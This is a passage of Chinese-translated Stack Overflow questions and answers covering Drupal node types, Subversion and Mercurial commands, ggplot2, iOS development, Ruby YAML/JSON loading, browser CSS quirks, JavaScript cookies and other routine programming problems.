    // Delete all the nodes at once
    node_delete_multiple($nids);

    //remove the content type
    node_type_delete('course');

    //and their associated fields
    foreach(_course_installed_fields() as $field)
    {
        field_delete_field($field['field_name']);
    }
}

?> 
```

我在 course.module 中有这个：

```
<?php
function course_node_info()
{
    return array('course' => array('name'        => t('Course'),
                                   'base'        => 'course',
                                   'description' => t('A course content type'),
                                   'has_title'   => TRUE,
                                   'title_label' => t('Title'),
                                   'locked'      => FALSE,),);
}
?> 
```

**已解决** 原来这两个问题的解决方案是将其添加到 course.module 中：

```
function course_form($node, $form_state)
{
return node_content_form($node, $form_state);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-25T19:49:37.590

事实证明，这两个问题的解决方案是将其添加到 course.module 中：

```
function course_form($node, $form_state)
{
    return node_content_form($node, $form_state);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-13T14:09:11.497

我只是想为这个问题添加一个旁白，以防有人遇到我遇到的问题。

如果您在创建自定义类型的节点时无法显示节点表单，请寻找一件小事：您是否使用与模块名称不同的名称作为节点类型机器名称，并且是 hook_form 的名称() 为您的节点类型使用您的节点类型机器名称还是模块名称？

我有一个名为 Novel 的模块，它创建了一个名为 Novel_section 的节点类型。经过大约 6 个小时的努力，试图弄清楚为什么新的 novel_section 类型的表单没有显示正文或标题字段，并且在网上阅读了关于如何使用自定义模块创建自定义节点类型的帖子后，我终于意识到了是因为我的 hook_form() 被称为 Novel_form()（就像您命名任何其他模块函数一样）而不是 Novel_section_form()。

所有在线示例都假设您的模块名称与您的节点类型机器名称相同，但并非总是如此。此外，没有人提到 hook_form() 需要使用您的节点类型机器名称，而不管模块名称是什么。

如果像我一样，您的模块不仅仅是创建节点类型或创建多个节点类型，并且您无法弄清楚为什么您无法让标题和/或正文显示在新节点中新节点类型的表单，这应该会有所帮助。

# svn - svndumpfilter 成功，但我在新仓库中看到空内容

> ID：10305611
> 
> 赞同：0
> 
> 时间：2012-04-24T20:35:46.287
> 
> 标签：svn, svndumpfilter

我最近将我的“dir1”从“myoldrepo/trunk/dir1”移动到“myoldrepo/archives/dir1”。现在我想把它单独移到一个新的仓库中。所以我做了以下事情：

```
sudo -u apache svnadmin create mynewrepo
sudo -u apache svnadmin dump myoldrepo | svndumpfilter include myoldrepo/archives/dir1  > dumpfile
sudo -u apache svnadmin load mynewrepo < dumpfile 
```

所有步骤都很好..我也可以看到

```
Started new transaction, based on original revision xx
------- Committed revision xx 
```

但是当我真正在 sventon 打开我的 newrepo 时，我只看到空的内容。我看到了日志消息。为什么会这样？我该如何解决这个问题？

myoldrepo 中有一个 dav 文件夹，但 mynewrepo 没有它。这会产生问题吗

编辑：在我创建了一个空文件夹和文件后，repo 自动在其中获得了一个 DAV 文件夹。所以我认为 DAV 不是问题

谢谢！

# tortoisesvn - 如何让 Tortoise SVN 忽略全局忽略模式？

> ID：10305612
> 
> 赞同：4
> 
> 时间：2012-04-24T20:35:57.683
> 
> 标签：tortoisesvn

我在 Tortoise SVN 中设置了一个全局忽略模式，这正是我想要的。但有时我想将一个文件夹及其所有内容添加到 SVN，而不管模式如何。特别是当我创建一个“外部”文件夹时，我会这样做，该文件夹将包含通常会被忽略的构建文件，例如 .libs 和 .dlls。

当我需要这样做的时候，我去 TortoiseSVN->Settings 并删除全局忽略模式。然后我提交文件，然后再次添加全局忽略模式。

有没有更简单的方法来做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-25T09:55:35.360

不是我知道的。

但是，如果 svn 命令行客户端不受 TortoiseSVN 的全局忽略模式的影响，您可以使用它来开始跟踪文件。

不管怎样，我不会担心这个。因为有一件事你应该考虑。

你看，在我看来，使用 TortoiseSVN 的全局忽略模式*气味*：你正在使用一个仅限本地的未跟踪的忽略列表，这意味着任何检查你的代码的人都将能够提交错误的事情。

诚然，Subversion`svn:ignore`忽略文件的做法充其量是愚蠢的，但至少它是版本化的。

作为最后的想法，我不了解你，但我非常重视拥有一个“即插即用”的开发环境，在这个环境中，使*新人*富有成效的步骤数量尽可能减少。你知道，自动化构建、自动化测试等。

并且允许新人提交任何 .dlls、.libs 和 .exes 并不能完全推动球前进。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-08T18:59:52.960

使用 Tortoise 并假设您的项目已经在 SVN 中（如果没有，请播种 SVN）。
1\. 在 repo 浏览器中找到你的项目。
2.`create folder...`通过右键单击父节点所在的节点。例如：斌。
3.`svn update`在您的本地结帐路径上运行。
4.将您想要的任何文件放在该文件夹中并提交

这将覆盖该项目的 Tortoise 全局忽略。干杯。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-05-08T19:56:14.190

还有另一种方法，使用命令行。它不是直接使用 Tortoise，尽管 Tortoise 也安装了命令行客户端，所以它仍然是可能的。

从命令行运行：

```
svn status --no-ignore 
```

忽略全局忽略。

# r - ggplot2中的geom_map边框

> ID：10305614
> 
> 赞同：2
> 
> 时间：2012-04-24T20:36:04.800
> 
> 标签：r, ggplot2

我正在尝试使用 ggplot2 中的 geom_map 生成等值线图。我想用黑色或其他颜色勾勒出各个区域，以区分渐变上颜色相似的区域。使用以下代码，我尝试设置颜色来勾勒区域。该代码生成地图，但没有边界。当我将颜色命令移到美学中时，它会产生带有图例的预期“粉红色”边框。任何想法为什么设置颜色不会产生边框，但映射会？我在 ggplot2 Google Group 上看到了类似的讨论。

```
ggplot(subset(df, as.character(variable) == "value"), aes(map_id = id)) +
  geom_map(aes(fill = pct), colour = "black", map = ggmap) +
  expand_limits(x = ggmap$long, y = ggmap$lat) +
  scale_fill_gradient(low = "antiquewhite", high = "darkred") +
  opts(title = "Title", panel.background = theme_rect(fill = "grey90")) 
```

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-24T21:00:22.263

您需要使用 geom_polygon 添加多边形边框。在下面的代码中，您需要为每个多边形填写`XXXX`数据集 ( `data`) 和纬度和经度 (`x`和`y`) 值。我通常从`maps`包中获取我的数据，不确定这是否是你所做的。

```
ggplot(subset(df, as.character(variable) == "value"), aes(map_id = id)) +
  geom_map(aes(fill = pct), colour = "black", map = ggmap) +
  geom_polygon(data=XXXX, aes(x=XXXX, y=XXXX), colour='black', fill=NA) +
  expand_limits(x = ggmap$long, y = ggmap$lat) +
  scale_fill_gradient(low = "antiquewhite", high = "darkred") +
  opts(title = "Title", panel.background = theme_rect(fill = "grey90")) 
```

# iphone - 在 itune 配置门户中的团队帐户下的不同组之间共享用于分发证书的私钥的任何问题

> ID：10305616
> 
> 赞同：5
> 
> 时间：2012-04-24T20:36:10.333
> 
> 标签：iphone, ios, certificate, private-key

我们是一所大型大学，在 Apple iTunes 供应门户中拥有一个团队帐户。我们有多个不同的团队开发 iOS 应用程序，这些应用程序将在团队帐户（大学名称）下发布。似乎苹果只允许创建一个分发证书。要发布应用程序，每个组都需要私钥来签署应用程序。如果我们选择在所有组之间共享私钥，有什么顾虑吗？

也有人建议吊销当前的证书。我了解它不会影响商店中当前的应用程序。但是其他人在想要发布更新时必须再次吊销证书，不是吗？

否则，如果不共享私钥，还有其他解决方案吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-25T02:42:49.850

应用程序分发是团队代理的任务，因此她是唯一应该拥有分发证书私钥的人。供应门户没有任何共享私钥的方法，我认为它永远不会有这种功能。

预期的方式（Apple 预期的）是将组织中不同组开发的所有应用程序发送给团队代理，然后由其签名并上传到商店。

正常的方式（我在与我合作过的 4 个组织中看到的）是代理与不同组的领导共享私钥，在应用程序上工作。

每次都吊销分发证书，虽然可能不会伤害已经在商店里的应用程序，但肯定会引起不必要的麻烦。

# ios - iOS 中的日历控件

> ID：10305621
> 
> 赞同：2
> 
> 时间：2012-04-24T20:36:29.017
> 
> 标签：ios, calendar, tapku

我希望在我的应用程序的一个视图控制器中有一个日历控件。我环顾四周，发现 Kal 和 Tapku 是最受欢迎的。我能够将 Kal 集成到我的项目中，但它似乎没有做我想做的事情。

我正在寻找的是 - 1\. 字体颜色、单元格颜色、字体粗体/斜体等应该可以通过 API 进行定制。2\. 我应该能够从任何单元格（即日期）切换到另一个视图控制器 3\. 我应该能够在屏幕上显示更多控件.. 例如一些标签等。

是否可以获得任何此类预先存在的第 3 方日历控件，我可以对其进行自定义以满足我的需要？还是我需要创建自己的日历控件？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-21T07:50:22.360

看看我的开源日历组件：[https ://github.com/k06a/ABCalendarPicker](https://github.com/k06a/ABCalendarPicker)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-07-17T03:00:52.440

我的开源日历应该能够完成所有这些

[https://github.com/nopshusang/SACalendar](https://github.com/nopshusang/SACalendar)

尽管 API 不完整，但您可以通过编辑 SACalendarConstants.h 中的常量来自定义字体和所有其他 UI

您可以通过实现委托功能转至另一个视图

```
-(void) SACalendar:(SACalendar*)calendar didSelectDate:(int)day month:(int)month year:(int)year 
```

每次单击单元格时都会调用它。然后，您可以从那里启动一个 segue。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-11T08:55:31.413

You can try one of them from here - [Code4App Calendars](http://code4app.net/category/calendar)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-24T21:52:56.867

如果是 Kal，您必须在 KalTileView.m 中进行更改，您可以在其中设置背景图像和字体颜色（在 drawRect 方法中）。

希望这可以帮助。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-24T21:01:56.300

您是否看过 Rescoe 提供的控件？它不是免费的，我没有亲自评估过它，但根据我在其他平台（即 Windows Mobile）上使用它们的经验，它们非常强大。

[http://www.resco.net/developer/mobileformstoolkit/details.aspx?comp=MonthCalendar&p=iOS](http://www.resco.net/developer/mobileformstoolkit/details.aspx?comp=MonthCalendar&p=iOS)

编辑：该控件需要单声道触摸，这可能不是你要找的......

# vba - 将某些单元格复制到新的工作簿/工作表

> ID：10305623
> 
> 赞同：-2
> 
> 时间：2012-04-24T20:36:36.263
> 
> 标签：vba, excel, excel-2003

我已经对以前的问题进行了彻底的搜索，但我找不到我正在寻找的东西。

每天我必须从互联网上下载一个文件，其中的列总是相同的，但值（除了标题行）是不同的。有很多专栏我不需要关注。

我希望能够创建一个宏，我将链接到 Excel 中的一个按钮，该按钮将： 从一张工作表中获取某些列，并将它们粘贴到新的空白工作表或工作簿中。

我在搜索时发现的大多数结果似乎都包含规则：“if something”或“when ...”等 - 我不需要这个。

我只是想制作一些需要：列：C、N、AC、AG、AZ 等并将它们粘贴到另一张空白纸中的 A、B、C、D 等列。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T21:08:25.260

幸运的是，为此编写代码非常简单。只需创建一个按钮和一个单击方法，然后将类似这样的内容放入方法的主体中：

```
Sheets("Sheet3").Select
Columns("A:A").Select
Selection.Copy
Sheets("Sheet4").Select
Range("A1").Select
ActiveSheet.Paste 
```

你需要为每一列做这件事，但如果你为用户创建一个漂亮的 UI，这一切都可以在代码中完成。

# ruby - 如何从文件中加载哈希？

> ID：10305626
> 
> 赞同：6
> 
> 时间：2012-04-24T20:36:52.660
> 
> 标签：ruby, hashtable

是否有 Ruby 工具可以让我以 (Abbreviated => Abr) 的格式加载缩写文件？然后我需要从另一个文件中读取每个单词。如果单词与缩写词中的单词匹配，我需要将其更改为缩写词。我想我可以使用 Hash 但我不知道如何从文件中加载它。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-04-24T22:17:36.870

[YAML](http://www.yaml.org/)是一种非常通用的格式，用于以可以在应用程序和编程语言之间传输的方式存储数据。[JSON](http://www.json.org/)是另一种替代方案，在网站中很常见。

我将 YAML 用于配置文件之类的东西，因为它很容易阅读和修改。例如，这个 Ruby 结构：

```
irb(main):002:0> foo = { 'a' => 1, 'b' => [2, 3], 'c' => { 'd' => 4, 'e' => 5 } }
{
    "a" => 1,
    "b" => [
        [0] 2,
        [1] 3
    ],
    "c" => {
        "d" => 4,
        "e" => 5
    }
} 
```

转换为 YAML 时如下所示：

```
irb(main):003:0> puts foo.to_yaml
--- 
a: 1
b: 
- 2
- 3
c: 
  d: 4
  e: 5 
```

您可以将其保存到文件中：

```
File.open('foo.yaml', 'w') { |fo| fo.puts foo.to_yaml } 
```

并将其读回：

```
bar = YAML.load_file('foo.yaml')
{
    "a" => 1,
    "b" => [
        [0] 2,
        [1] 3
    ],
    "c" => {
        "d" => 4,
        "e" => 5
    }
} 
```

同样，使用 JSON：

```
puts foo.to_json
{"a":1,"b":[2,3],"c":{"d":4,"e":5}} 
```

您可以像使用 YAML 一样将 JSON 保存到文件中，然后重新加载它并将其转回散列。虽然它的语法有点不同：

```
irb(main):011:0> File.open('foo.json', 'w') { |fo| fo.puts foo.to_json }
nil
irb(main):012:0> bar = JSON.parse(File.read('foo.json'))
{
    "a" => 1,
    "b" => [
        [0] 2,
        [1] 3
    ],
    "c" => {
        "d" => 4,
        "e" => 5
    }
} 
```

两者的最大优势是任何可以读取 YAML 或 JSON 的语言都可以读取这些文件并使用数据，无论是读取还是写入。

一旦有了散列，就很容易进行字符串替换，因为 Ruby String`gsub`可以理解散列。这是来自[文档](http://www.ruby-doc.org/core-1.9.3/String.html#method-i-gsub)：

> 如果第二个参数是一个哈希，并且匹配的文本是它的一个键，那么对应的值就是替换字符串。

这意味着您可以执行以下操作：

```
foo = 'Jackdaws love my giant sphinx of quartz'
bar = { 'quartz' => 'rosy quartz', 'sphinx' => 'panda' }
foo.gsub(Regexp.union(bar.keys), bar)
"Jackdaws love my giant panda of rosy quartz" 
```

您确实必须注意进行替换时的字边界冲突，但`\b`模式中的标志可能会有所帮助。使这项工作成为读者的练习。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-04-24T20:39:52.673

见`Marshal.load`和`Marshal.dump`。

此外，您可以考虑将哈希序列化为 yaml 文件，然后通过 YAML 读取/保存它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-01-22T03:44:29.897

在查找如何自己加载哈希后，我发现了这个[http://www.rubydoc.info/gems/bosh-director/1.1868.0/Bosh%2FDirector%2FConfig.load_hash 。](http://www.rubydoc.info/gems/bosh-director/1.1868.0/Bosh%2FDirector%2FConfig.load_hash)

我的示例是在 Rails 应用程序中处理 MongoDB 时。

所以我设置了一个 Initialize 方法来获取我将要使用的集合。

`def initialize @collection = self.class.collection end`

这里的 self.class 是我所在的类。我们以 People 为例。

加载方法如下

```
def load_collection(file_path)
  hash_values = self.class.load_hash(file_path)
  @collection.insert_many(hash)
end 
```

在 binding.pry 里面

```
[1] pry(#<People>)> file_path
=> "people_results.json"
[2] pry(#<People>)> hash
=> [{"number"=>0, "first_name"=>"SHAUN", "last_name"=>"JOHNSON", "gender"=>"M", "group"=>"15 to 19", "secs"=>1464}, {"number"=>1, "first_name"=>"TUAN", "last_name"=>"JOHNSON", "gender"=>"M", "group"=>"masters", "secs"=>3994}, {"number"=>2, "first_name"=>"EARLINE", "last_name"=>"BROWN", "gender"=>"F", "group"=>"masters", "secs"=>1415}...
[3] pry(#<People>)> self
=> #<People:0x007fc80301b5f8 @coll=#<Mongo::Collection:0x70248510355560 namespace=test.people>>
[4] pry(#<People>)> self.class
=> People 
```

所以在这种情况下，该`load_hash`方法需要一个参数，在这种情况下，我传入了一个包含一些数据的 json 文件。然后我将该数据插入到我的集合中。

# html - IE9 Float with Overflow:Hidden 和 Table Width 100% 无法正确显示

> ID：10305631
> 
> 赞同：10
> 
> 时间：2012-04-24T20:37:06.967
> 
> 标签：html, css, internet-explorer-9, css-float, html-table

我正在尝试在页面右侧浮动一个容器。在它的左边有很多表格，我需要 100% 的宽度。我希望它们一直延伸到右侧的浮动元素。当右侧的那个元素结束时，我希望表格延伸到页面的末尾。

这适用于除 IE 之外的所有浏览器。在 IE 中，所有表格都显示在右侧浮动元素的下方。我知道在 IE 中隐藏了溢出的解决方法，但我无法让它工作。

代码如下。

```
<head>
<style type="text/css">
.container{margin:0 auto; min-width:1000px; max-width:1200px;}
.sidebar{float:right;width:300px;margin-left:5px;}
.tholder{overflow:hidden;}
</style>
</head>
<div class="container">
<div class="sidebar">
<img src="dsfd.jpg" heigh="600" width="295">
</div>
<div class="tholder">
<Table width="100%" border="1"><tr><td>Text</td></tr></table>
</div>
<div class="tholder">
<Table width="100%" border="1"><tr><td>Test goes here</td></tr></table>
</div>
<div class="tholder">
<Table width="100%" border="1"><tr><td>text</td></tr></table>
</div>
</div> 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-04-24T20:45:34.990

当某些东西在其他浏览器中有效但在 IE9 中无效时，可能是您的标题不正确。检查这个：

```
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge" /> 
```

# android - 寻找在 Android 中使用 OpenGL ES 1.0 绘制形状的教程

> ID：10305633
> 
> 赞同：2
> 
> 时间：2012-04-24T20:37:32.650
> 
> 标签：android, opengl-es, shapes

尽管我尽了最大的努力，但我仍然无法找到有助于学习使用 OpenGL ES 1.0 绘制球体、圆锥体等形状的教程或一般信息。我已按照 Android OpenGL ES 教程绘制三角形并拥有非常广泛地使用该代码。我只是想知道如何继续使用更复杂的形状和使用 OpenGL ES。

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T02:09:11.357

我建议你看看这些，这对我在使用 android 学习 openGl 时非常有帮助

1.  [使用 open gl 绘制不同的对象](http://www.youtube.com/watch?v=OMwnTSk6hJo) 以及一些可能对您有帮助的资源
2.  [另请参阅此链接](http://www3.ntu.edu.sg/home/ehchua/programming/android/Android_3D.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-25T03:07:57.747

这是我自己的几个示例：

*   [ObjViewer](https://github.com/ldo/ObjViewer_Android)用于交互式查看 .obj 文件
*   [3D Compass](https://github.com/ldo/3D-Compass)，它演示了 3D 模型与相机图像的离屏合成。

# delphi - Delphi 控件中的 Ctrl+Backspace

> ID：10305634
> 
> 赞同：10
> 
> 时间：2012-04-24T20:37:38.617
> 
> 标签：delphi, vcl

键盘快捷键通常会从插入符号中`Ctrl+Backspace`删除左侧的单词。但它不适用于您所期望的任何标准 Delphi 控件（`TEdit`、、`TMemo`等`TComboBox`）。有趣的是，`Ctrl+Delete`工作得很好。

有人知道如何轻松纠正这种行为吗？

我知道重写该`KeyDown`过程会做到这一点，但这太复杂了，因为`KeyDown`必须为每个组件重写。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-04-24T20:42:58.897

这不是 Delphi 特有的问题。实际上，`TEdit`其他控件只是本机 Microsoft Windows 控件的包装器，它们的行为是这样的。例如，尝试使用记事本“选择字体”对话框中的编辑框。在启用自动完成的情况下编辑控件，但是，接受 Ctrl+Backspace 热键。我认为您可以通过以下方式轻松启用此功能

```
SHAutoComplete(Edit1.Handle,
  SHACF_AUTOAPPEND_FORCE_OFF or SHACF_AUTOSUGGEST_FORCE_OFF) 
```

（使用`ShLwApi`）。

# c# - PrintWindow 导致窗口闪烁

> ID：10305637
> 
> 赞同：0
> 
> 时间：2012-04-24T20:37:46.143
> 
> 标签：c#, screenshot

我的 C# 应用程序需要能够捕获特定窗口的位图，无论该窗口是否在顶部。我用 PrintWindow 做到这一点（感谢其他 stackoverflow 答案），它基本上就是这样做的......

```
...
[DllImport("user32.dll")]
public static extern bool PrintWindow(IntPtr hWnd, IntPtr hdcBlt, int nFlags); 
....
Bitmap thisScreenshot = new Bitmap(Width, Height);
Graphics gfxScreenshot = Graphics.FromImage(thisScreenshot);
IntPtr hdcBitmap = gfxScreenshot.GetHdc();
PrintWindow(stickyProgHandle, hdcBitmap, 0);
gfxScreenshot.ReleaseHdc(hdcBitmap);
... 
```

我现在遇到的唯一问题是每次调用 PrintWindow 时，我正在捕获的窗口都会闪烁（例如刷新该窗口）。假设 PrintWindow 实际上是我的最佳选择，我怎样才能摆脱闪烁？

UPDATE1：请注意，闪烁出现在我正在抓取屏幕截图的窗口中，而不是我的应用程序窗口中。

# mercurial - 如何在 Mercurial 中将文件恢复为“上次签入”状态？

> ID：10305643
> 
> 赞同：30
> 
> 时间：2012-04-24T20:37:55.313
> 
> 标签：mercurial, undo

我在磁盘上有一个假设的 Mercurial 存储库。当我意识到我已经把我正在处理的文件弄得一团糟时，我大部分时间都在创建一个新功能，并且想要将该文件恢复到其上次提交状态。

我可以`hg update`用来刷新存储库中的工作副本，但这会更新每个文件。

是否有一个可以只更新单个文件的 mercurial 命令？

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2012-04-24T20:43:11.237

有一个 mercurial 命令可以恢复文件。`hg revert`这应该恢复任何更改。您还可以将文件名传递给它，例如`hg revert fileName`.

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-04-25T23:53:23.157

`hg revert fileName`将该文件恢复为您所在的版本。如果要还原所有更改，可以运行`hg revert --all`.

这两个都将生成 fileName.orig 文件，因此您可以保留要还原的更改以防万一。如果您想还原文件并且没有所有 .orig 文件，您可以添加`-C`选项： `hg revert fileName -C` `hg revert --all -C`

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-24T20:41:26.047

我相信您可以输入`hg revert /path/to/file/<file name>`，它只会更新该文件。

# asp.net-mvc - 使用 ONE include 在 asp.net mvc 项目中包含所有 javascript 文件

> ID：10305644
> 
> 赞同：1
> 
> 时间：2012-04-24T20:38:02.227
> 
> 标签：asp.net-mvc

在 asp.net mvc 4.0 Intranet 项目中，我在 _layout.cshtml 中看到了这一点：

```
<script src="@System.Web.Optimization.BundleTable.Bundles.ResolveBundleUrl("~/Scripts/js")"></script> 
```

什么意思 /Scripts/js ？

我的问题是关于“js”！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:43:34.840

这是优化框架的一部分，它为您缩小和捆绑您的 JavaScript。这包括假定默认注册。有关更多介绍，请参阅[Scott Guthrie 的博客文章](http://weblogs.asp.net/scottgu/archive/2011/11/27/new-bundling-and-minification-support-asp-net-4-5-series.aspx)。

# javascript - 我的 Javascript cookie 在会话中过期，而不是在 30 天内

> ID：10305647
> 
> 赞同：4
> 
> 时间：2012-04-24T20:38:12.977
> 
> 标签：javascript, jquery, cookies

```
jQuery(document).ready(function(){
        if (document.cookie.indexOf('visited=true') === -1) {
            var expires = new Date();
            expires.setDate(expires.getDate()+30);
            document.cookie = "visited=true; path=/; expires="+expires.toUTCString();
            jQuery.colorbox({open:true,href:"<?=home_url()?>/popup/?site_type=2",iframe:true, innerWidth:"700px", innerHeight:"410px"});
        }                   
}); 
```

当我关闭浏览器时，这个 cookie 过期，但我希望它持续 30 天，直到他们再次看到弹出窗口。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-24T20:43:02.583

而不是使用`expires`，尝试`max-age`（以秒为单位）。这不涉及`Date`实例的创建和修改。

```
if (document.cookie.indexOf('visited=true') === -1) {
    document.cookie = "visited=true; path=/; max-age=2592000;"; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T20:52:41.987

使用 Cookie 对象：

```
var CookieExpiryTime = {
    END_OF_SESSION : 0,
    SECOND : 1000,
    MINUTE : 1000 * 60,
    HOUR : 1000 * 60 * 60,
    DAY : 1000 * 60 * 60 * 24,
    YEAR : 1000 * 60 * 60 * 24 * 365,
    NEVER : 1000 * 60 * 60 * 24 * 365 * 20
}
var Cookie = {
    Set: function (n, v, time, path) {
        var e = '', d;
        if (time) {
            d = new Date();
            d.setTime(d.getTime() + (time));
            e = "; expires=" + d.toGMTString();
        }
        if (!path) path = "/";
        document.cookie = n + "=" + v + e + "; path="+path;
    },
    Get: function (n) {
        var match = n + "=", c = '', ca = document.cookie.split(';'), i;
        for (i = 0; i < ca.length; i++) {
            c=String(ca[i]).trim()
            if (c.indexOf(match) === 0) {
                return c.substring(match.length, c.length);
            }
        }
        return null;
    },
    Unset: function (n) {
        this.Set(n, "", -1);
    }
}; 
```

只需使用以下代码设置您的 cookie：

```
Cookie.Set("visited", "true", CookieExpiryTime.MONTH); 
```

就那么简单！

此外，要将日期增加 30 天，您必须这样做：

```
expires.setDate(expires.getDate()+30*24*60*60*1000); 
```

因为时间是毫秒而不是天。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:42:10.533

一种可能的替代方法是使用 html5 localStorage。它在 IE8+ 中受支持，并且与会话没有任何关系，因此您不会在那里遇到任何问题。如果您采用 localStorage 方法，这就是您可能希望如何构建代码的方式。

```
var 30_DAYS = 1000 * 60 * 60 * 24 * 30;
var msgSent = localStorage.msgSent;
var now = new Date().getTime();
var diff = now - msgSent;
if (!msgSent || msgSent > 30_DAYS) {
  sendMsg();
}

function sendMsg() {
 // do your popup thing
 localStorage.msgSent = new Date.getTime();
} 
```

# html - 防止在 IE 中点击时移动

> ID：10305658
> 
> 赞同：26
> 
> 时间：2012-04-24T20:39:05.583
> 
> 标签：html, css, internet-explorer

当您在页面中有一个简单的元素并在 IE8/9 中单击它（在单击过程中按住鼠标以查看效果）时，按钮会向下和向右移动一点。

我假设这是默认 IE 样式的一部分。有没有办法阻止这种行为？

[http://jsfiddle.net/tmcconechy/hqm59/](http://jsfiddle.net/tmcconechy/hqm59/)

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2014-01-22T11:22:45.837

您可以停止在 IE 按钮中移动的文本：

```
button:active span, button:focus span {
    position:relative;
    top: 0;
    left: 0;
}

<button><span>no move</span></button> 
```

[http://jsfiddle.net/dQVA7/](http://jsfiddle.net/dQVA7/)

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2015-09-18T15:05:56.067

把你的文字放在里面`<span>`，`position:relative`它会修复的。

```
button span{
    position: relative;
} 
```

不需要*顶部*和*左侧*定义。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-24T21:51:01.807

您可以对按钮应用一些样式。按钮{边距：0px; 填充：0px;}

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2017-01-17T09:42:20.197

如果您不介意使用 JavaScript，显然这可以解决问题：

```
$(document).on('mousedown', 'button, input[type="button"], input[type="submit"]', function(e) {
  e.preventDefault();
}); 
```

# iphone - 不确定如何处理“由于未捕获的异常‘NSInvalidArgumentException’而终止应用程序”

> ID：10305659
> 
> 赞同：0
> 
> 时间：2012-04-24T20:39:06.017
> 
> 标签：iphone, class, uitableview, crash, unrecognized-selector

我正在创建一个应用程序，该应用程序使用我自己创建的类*Entry*将特定数据存储在数组中。但是，当我尝试访问存储在 Entry 对象中的值之一时，我一直遇到此错误。每次我提示用户创建这些对象之一时，它都会被添加到“rawArray”中，而后者又存储到 [NSUserDefaults standardUserDefaults] 中。在这些代码行中，程序崩溃了：

```
Entry *currEntry = [[[NSUserDefaults standardUserDefaults] arrayForKey:@"rawArray"] objectAtIndex:section];
NSLog(@"date: %@", [currEntry getDate]); 
```

我只是试图拉出与当前 UITableView 部分相对应的数组元素，然后 NSLog 将“日期”变量存储在其中。这是 Entry 类的 getDate 方法：

```
-(NSString *)getDate{
   return date;
} 
```

*日期*对象本身只是 Entry 类中的另一个 NSString，它是在类的 init 中设置的。如果有人能帮我解决这个问题，我将非常感激。

这是完整的崩溃日志：

```
2012-04-24 16:31:32.545 Know[7278:f803] -[__NSCFString getDate]: unrecognized selector sent to instance 0x68598f0
2012-04-24 16:31:32.546 Know[7278:f803] *** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '-[__NSCFString getDate]: unrecognized selector sent to instance 0x68598f0'
*** First throw call stack:
(0x13cb052 0x155cd0a 0x13ccced 0x1331f00 0x1331ce2 0xa930 0xb85c9 0xb8480 0x1fc849 0x1ff722 0xaf7c7 0xaf2c1 0xb228c 0xb6783 0x61301 0x13cce72 0x1d7592d 0x1d7f827 0x1d05fa7 0x1d07ea6 0x1d9330c 0x33530 0x139f9ce 0x1336670 0x13024f6 0x1301db4 0x1301ccb 0x12b4879 0x12b493e 0x22a9b 0x1d98 0x1cf5)
terminate called throwing an exception 
```

* * *

在我切换到使用 NSKeyedArchiver/Unarchiver 之后，我仍然遇到了同样的问题。这是我的新检索和保存方法：

```
-(void)saveToUserDefaults:(NSMutableArray *)array{
    NSData *myEncodedObject = [NSKeyedArchiver archivedDataWithRootObject:array];
    [[NSUserDefaults standardUserDefaults] setObject:myEncodedObject forKey:@"rawArray"];
}

-(NSMutableArray *)loadFromUserDefaults{
    NSData *myDecodedObject = [[NSUserDefaults standardUserDefaults] objectForKey:@"rawArray"];
    NSMutableArray *decodedArray =[NSKeyedUnarchiver unarchiveObjectWithData: myDecodedObject];
    return decodedArray;
} 
```

以下是使程序崩溃的新代码行：

```
Entry *currEntry = [[self loadFromUserDefaults] objectAtIndex:section];
NSLog(@"date: %@", [currEntry getDate]); 
```

这是更新的崩溃日志：

```
2012-04-24 17:43:36.853 Know[10314:f803] -[__NSCFString getDate]: unrecognized selector sent to instance 0x6acc260
2012-04-24 17:43:36.904 Know[10314:f803] *** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '-[__NSCFString getDate]: unrecognized selector sent to instance 0x6acc260'
*** First throw call stack:
(0x13ce052 0x155fd0a 0x13cfced 0x1334f00 0x1334ce2 0xb710 0xbb5c9 0xbb480 0x1ff849 0x202722 0xb27c7 0xb22c1 0xb528c 0xb9783 0x64301 0x13cfe72 0x1d7892d 0x1d82827 0x1d08fa7 0x1d0aea6 0x1d9630c 0x36530 0x13a29ce 0x1339670 0x13054f6 0x1304db4 0x1304ccb 0x12b7879 0x12b793e 0x25a9b 0x2a18 0x2975)
terminate called throwing an exception 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:48:23.870

